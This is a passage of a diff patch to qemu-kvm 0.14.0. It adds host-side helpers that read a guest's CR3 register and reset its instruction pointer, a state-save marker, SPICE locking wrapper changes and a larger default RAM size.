+	    printf("%s\n", se->idstr);
+	    qemu_put_buffer(f, marker, 16);
+
+	}
+
         /* Section type */
         qemu_put_byte(f, QEMU_VM_SECTION_END);
         qemu_put_be32(f, se->section_id);
diff -Nurp qemu-kvm-0.14.0+noroms.orig/target-i386/helper.c qemu-kvm-0.14.0+noroms/target-i386/helper.c
--- qemu-kvm-0.14.0+noroms.orig/target-i386/helper.c	2014-02-21 10:59:49.951707985 -0500
+++ qemu-kvm-0.14.0+noroms/target-i386/helper.c	2014-02-19 10:12:31.000000000 -0500
@@ -254,6 +254,26 @@ done:
 #define DUMP_CODE_BYTES_TOTAL    50
 #define DUMP_CODE_BYTES_BACKWARD 20
 
+#if  !defined(CONFIG_USER_ONLY) 
+target_phys_addr_t cpu_get_cr3 (CPUState *env){
+  /*jfp get cr3 */
+  if (env == NULL)
+    printf("this sucks\n");
+  cpu_synchronize_state(env);
+  return env->cr[3];
+}
+
+uint64_t cpu_alter_state (CPUState *env, uint64_t new_eip){
+  /*jfp alter_state*/
+  uint64_t old_eip;
+  cpu_synchronize_state(env);
+  old_eip = env->eip;
+  env->eip = new_eip ;
+  
+  return old_eip;
+}
+
+#endif /* !defined(CONFIG_USER_ONLY) */
 void cpu_dump_state(CPUState *env, FILE *f, fprintf_function cpu_fprintf,
                     int flags)
 {
diff -Nurp qemu-kvm-0.14.0+noroms.orig/test qemu-kvm-0.14.0+noroms/test
--- qemu-kvm-0.14.0+noroms.orig/test	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/test	2014-02-19 10:12:31.000000000 -0500
@@ -0,0 +1 @@
+afas
diff -Nurp qemu-kvm-0.14.0+noroms.orig/ui/spice-display.c qemu-kvm-0.14.0+noroms/ui/spice-display.c
--- qemu-kvm-0.14.0+noroms.orig/ui/spice-display.c	2014-02-21 10:59:50.132712120 -0500
+++ qemu-kvm-0.14.0+noroms/ui/spice-display.c	2014-02-19 10:12:20.000000000 -0500
@@ -186,18 +186,18 @@ void qemu_spice_create_host_primary(Simp
     surface.mem        = (intptr_t)ssd->buf;
     surface.group_id   = MEMSLOT_GROUP_HOST;
 
-    qemu_mutex_unlock_iothread();
+    qxl_unlock_iothread(ssd);
     ssd->worker->create_primary_surface(ssd->worker, 0, &surface);
-    qemu_mutex_lock_iothread();
+    qxl_lock_iothread(ssd);
 }
 
 void qemu_spice_destroy_host_primary(SimpleSpiceDisplay *ssd)
 {
     dprint(1, "%s:\n", __FUNCTION__);
 
-    qemu_mutex_unlock_iothread();
+    qxl_unlock_iothread(ssd);
     ssd->worker->destroy_primary_surface(ssd->worker, 0);
-    qemu_mutex_lock_iothread();
+    qxl_lock_iothread(ssd);
 }
 
 void qemu_spice_vm_change_state_handler(void *opaque, int running, int reason)
@@ -207,9 +207,9 @@ void qemu_spice_vm_change_state_handler(
     if (running) {
         ssd->worker->start(ssd->worker);
     } else {
-        qemu_mutex_unlock_iothread();
+        qxl_unlock_iothread(ssd);
         ssd->worker->stop(ssd->worker);
-        qemu_mutex_lock_iothread();
+        qxl_lock_iothread(ssd);
     }
     ssd->running = running;
 }
diff -Nurp qemu-kvm-0.14.0+noroms.orig/ui/spice-display.h qemu-kvm-0.14.0+noroms/ui/spice-display.h
--- qemu-kvm-0.14.0+noroms.orig/ui/spice-display.h	2014-02-21 10:59:50.131712097 -0500
+++ qemu-kvm-0.14.0+noroms/ui/spice-display.h	2014-02-19 10:12:21.000000000 -0500
@@ -43,6 +43,9 @@ typedef struct SimpleSpiceDisplay {
     QXLRect dirty;
     int notify;
     int running;
+
+    /* qemu-kvm locking ... */
+    void *env;
 } SimpleSpiceDisplay;
 
 typedef struct SimpleSpiceUpdate {
@@ -52,6 +55,9 @@ typedef struct SimpleSpiceUpdate {
     uint8_t *bitmap;
 } SimpleSpiceUpdate;
 
+void qxl_unlock_iothread(SimpleSpiceDisplay *ssd);
+void qxl_lock_iothread(SimpleSpiceDisplay *ssd);
+
 int qemu_spice_rect_is_empty(const QXLRect* r);
 void qemu_spice_rect_union(QXLRect *dest, const QXLRect *r);
 
diff -Nurp qemu-kvm-0.14.0+noroms.orig/vl.c qemu-kvm-0.14.0+noroms/vl.c
--- qemu-kvm-0.14.0+noroms.orig/vl.c	2014-02-21 10:59:50.199713651 -0500
+++ qemu-kvm-0.14.0+noroms/vl.c	2014-02-19 10:12:30.000000000 -0500
@@ -169,7 +169,7 @@ int main(int argc, char **argv)
 //#define DEBUG_NET
 //#define DEBUG_SLIRP
 
-#define DEFAULT_RAM_SIZE 128
+#define DEFAULT_RAM_SIZE 384
 
 #define MAX_VIRTIO_CONSOLES 1
 
